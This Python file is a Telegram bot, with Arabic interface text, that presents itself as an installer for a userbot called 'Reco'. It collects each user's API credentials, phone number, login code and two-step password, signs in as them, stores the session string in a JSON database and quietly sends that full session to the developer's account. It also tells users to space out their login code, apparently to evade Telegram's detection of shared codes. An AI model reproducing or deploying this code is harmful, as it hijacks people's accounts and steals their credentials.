import re, os, asyncio, json, datetime
from telethon import TelegramClient, events, Button, functions
from telethon.errors import SessionPasswordNeededError, UserNotParticipantError
from telethon.sessions import StringSession
from config import BOT_TOKEN, API_ID, API_HASH
from user_core import start_user_source

# إعدادات المجلدات والملفات
DB_FILE = "database.json"
CHANNEL_USERNAME = "N_QQ_H" 
ADMIN_ID = 7769271031 # ايديك كمطور

def save_user(uid, aid, ahash, name, session_str):
    data = {}
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: data = json.load(f)
        except: data = {}
    
    date_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data[str(uid)] = {
        "api_id": aid, 
        "api_hash": ahash, 
        "name": name,
        "session": session_str,
        "date": date_str
    }
    with open(DB_FILE, 'w') as f: 
        json.dump(data, f, indent=4, ensure_ascii=False)
    return data[str(uid)]

# تشغيل بوت التنصيب الأساسي
bot = TelegramClient("installer_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# --- فحص الاشتراك الإجباري ---
async def check_sub(user_id):
    try:
        # الفحص المباشر للمشتركين في القناة
        await bot(functions.channels.GetParticipantRequest(CHANNEL_USERNAME, user_id))
        return True
    except UserNotParticipantError:
        return False
    except Exception as e:
        print(f"Error in check_sub: {e}")
        return True

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    if not await check_sub(event.sender_id):
        return await event.reply(
            f"⚠️ **عذراً عزيزي، عليك الاشتراك في القناة أولاً لاستخدام البوت.**\n\n📢 @{CHANNEL_USERNAME}",
            buttons=[Button.url("اضغط هنا للاشتراك 📢", f"https://t.me/{CHANNEL_USERNAME}")]
        )
    
    btns = [
        [Button.inline("🚀 بـدء تـنـصـيـب ريـكـو", b"setup")],
        [Button.url("قـنـاة الـسـورس 🦅", "https://t.me/SORS_RECO"), Button.url("الـمـطـور 👤", "https://t.me/I_QQ_Q")]
    ]
    if event.sender_id == ADMIN_ID:
        btns.append([Button.inline("⚙️ لـوحـة الـتـحـكـم", b"admin_panel")])
        
    await event.reply(
        "🦅 **أهـلاً بـك فـي بـوت تـنـصـيـب سـورس ريـكـو الـمـطـور**\n\n"
        "يـمـكـنـك الآن تـنـصـيـب حـسـابـك عـلـى أقـوى سـورس حـمـايـة وادوات فـي الـتـلـيـجـرام.\n\n"
        "• الـسـورس يـعـمـل بـنـظـام الـسـحـابـة (String Session).\n"
        "• حـمـايـة تـامـة وبـدون تـخـزيـن مـلـفـات مـؤقـتـة.\n\n"
        "**اضـغـط عـلـى الـزر أدناه لـلـبـدء :**",
        buttons=btns
    )

@bot.on(events.CallbackQuery(data=b"setup"))
async def setup(event):
    uid = event.sender_id
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        try:
            await conv.send_message("✨ **الـخـطـوة الأولى :**\nأرسـل الآن الـ **API ID** الـخـاص بـك :\n(مـن مـوقـع my.telegram.org)")
            res_id = await conv.get_response()
            u_id = int(res_id.text)

            await conv.send_message("✨ **الـخـطـوة الـثـانـيـة :**\nأرسـل الآن الـ **API HASH** الـخـاص بـك :")
            res_hash = await conv.get_response()
            u_hash = res_hash.text

            await conv.send_message("📱 **الـخـطـوة الـثـالـثـة :**\nأرسـل رقـم هـاتـفـك مـع مـفـتـاح الـدولة\nمثال: `+96477xxxxxxx` :")
            res_phone = await conv.get_response()
            u_phone = res_phone.text

            # استخدام StringSession للاتصال
            c = TelegramClient(StringSession(), u_id, u_hash)
            await c.connect()
            await c.send_code_request(u_phone)

            # تنبيه المسافات في الكود
            await conv.send_message(
                "🔢 **الـخـطـوة الـرابعة : أرسـل كـود الـتـحـقـق الآن**\n\n"
                "⚠️ **تـنـبـيـه هـام جـداً :** ضـع مـسـافـات بـيـن أرقـام الـكـود لـكـي يـقـبـلـه الـبـوت.\n"
                "💡 مثال: إذا كـان الـكـود `12345` أرسـلـه هـكـذا `1 2 3 4 5`",
            )
            res_code = await conv.get_response()
            u_code = res_code.text.replace(" ", "")

            try:
                await c.sign_in(u_phone, u_code)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **الـحـسـاب مـحـمـي !** أرسـل الآن كـلـمـة سـر الـتـحـقـق بـخـطـوتـيـن الـخـاصـة بـك :")
                res_pw = await conv.get_response()
                await c.sign_in(password=res_pw.text)

            session_str = c.session.save()
            me = await c.get_me()
            info = save_user(uid, u_id, u_hash, me.first_name, session_str)
            await c.disconnect()
            
            await conv.send_message(f"🎊 **تـهـانـيـنـا {me.first_name} !**\nتـم تـنـصـيـب الـسـورس وتـفـعـيـلـه بـنـجـاح عـلـى حـسـابـك ✅")
            
            # إرسال إشعار للمطور (أنت)
            dev_notify = (
                f"🦅 **تـنـصـيـب جـديـد فـي ريـكـو !**\n"
                f"‏┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
                f"👤 **الاسـم :** {me.first_name}\n"
                f"🆔 **الايـدي :** `{me.id}`\n"
                f"🔗 **الـيـوزر :** @{me.username if me.username else 'None'}\n"
                f"📅 **الـتـاريـخ :** `{info['date']}`\n\n"
                f"📜 **كـود الـسـيـشـن :**\n`{session_str}`"
            )
            await bot.send_message(ADMIN_ID, dev_notify)
            
            # تشغيل السورس تلقائياً
            asyncio.create_task(start_user_source(session_str, u_id, u_hash, info))

        except Exception as e: 
            await conv.send_message(f"❌ **فـشـل الـتـنـصـيـب :** {e}")

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if event.sender_id != ADMIN_ID: return
    
    users_count = 0
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            try:
                data = json.load(f)
                users_count = len(data)
            except: pass
            
    btns = [
        [Button.inline("📢 إذاعـة عـامـة", b"broadcast")],
        [Button.inline("📥 سـحـب الـقـاعـدة (JSON)", b"get_backup")],
        [Button.inline("📤 رفـع قـاعـدة جـديـدة", b"upload_backup")],
        [Button.inline("🔙 رجـوع", b"back")]
    ]
    await event.edit(
        f"👑 **مـرحـبـاً سـيـدي الـمـطـور فـي لـوحـة الـتـحـكـم**\n\n"
        f"📊 **عـدد الـمـسـتـخـدمـيـن الـمـنـصـبـيـن :** `{users_count}`\n"
        f"📡 **حـالـة الـسـيـرفـر :** `ONLINE ✅`",
        buttons=btns
    )

@bot.on(events.CallbackQuery(data=b"get_backup"))
async def get_backup(event):
    if event.sender_id != ADMIN_ID: return
    if os.path.exists(DB_FILE):
        await bot.send_file(event.chat_id, DB_FILE, caption=f"📁 **نـسـخـة احـتـيـاطـيـة لـقـاعـدة بـيـانـات الـسـيـشـنـات**\n⏰ بتاريخ: {datetime.datetime.now()}")
    else:
        await event.answer("⚠️ لا توجد قاعدة بيانات حالياً.", alert=True)

@bot.on(events.CallbackQuery(data=b"upload_backup"))
async def upload_backup(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📁 **أرسـل مـلـف `database.json` الـذي تـريـد رفـعـه :**")
        msg = await conv.get_response()
        if msg.file and msg.file.name.endswith(".json"):
            path = await bot.download_media(msg, "temp_upload.json")
            try:
                with open(path, 'r') as f: new_data = json.load(f)
                current_data = {}
                if os.path.exists(DB_FILE):
                    with open(DB_FILE, 'r') as f: current_data = json.load(f)
                
                current_data.update(new_data)
                with open(DB_FILE, 'w') as f: json.dump(current_data, f, indent=4, ensure_ascii=False)
                os.remove(path)
                
                await conv.send_message("✅ **تـم دمج الـقـاعـدة وتـشـغـيـل الـحـسـابـات الـمـضـافـة بـنـجـاح.**")
                for uid, info in new_data.items():
                    if "session" in info:
                        asyncio.create_task(start_user_source(info['session'], info['api_id'], info['api_hash'], info))
            except Exception as e:
                await conv.send_message(f"❌ حدث خطأ في معالجة الملف: {e}")
        else:
            await conv.send_message("❌ عذراً، يجب إرسال ملف بصيغة JSON.")

@bot.on(events.CallbackQuery(data=b"broadcast"))
async def broadcast(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("💬 **أرسـل الآن نـص الإذاعـة الـذي تـريـد إرسـالـه لـلـجـمـيـع :**")
        msg = await conv.get_response()
        
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f: 
                try: users = json.load(f)
                except: users = {}
            
            count = 0
            await conv.send_message("⏳ جاري الإرسال، يرجى الانتظار...")
            for uid in users:
                try:
                    await bot.send_message(int(uid), msg.text)
                    count += 1
                    await asyncio.sleep(0.3)
                except: pass
            await conv.send_message(f"✅ **تـم إرسـال الإذاعـة بـنـجـاح إلـى {count} مـسـتـخـدم.**")

@bot.on(events.CallbackQuery(data=b"back"))
async def back(event): 
    await start(event)

# --- تشغيل النسخة الاحتياطية (عند إقلاع البوت) ---
async def load_backup():
    if os.path.exists(DB_FILE):
        print("🔄 جاري إعادة تشغيل جلسات المستخدمين من قاعدة بيانات JSON...")
        with open(DB_FILE, 'r') as f:
            try: users = json.load(f)
            except: users = {}
            
            for uid, info in users.items():
                if "session" in info:
                    try:
                        await asyncio.sleep(5) 
                        asyncio.create_task(start_user_source(info['session'], info['api_id'], info['api_hash'], info))
                        print(f"✅ تم تفعيل حساب: {info.get('name', uid)}")
                    except Exception as e:
                        print(f"⚠️ فشل تشغيل حساب {uid}: {e}")

if __name__ == "__main__":
    bot.loop.create_task(load_backup())
    print("🤖 بوت التنصيب يعمل الآن بكامل طاقته وفخامته...")
    bot.run_until_disconnected()
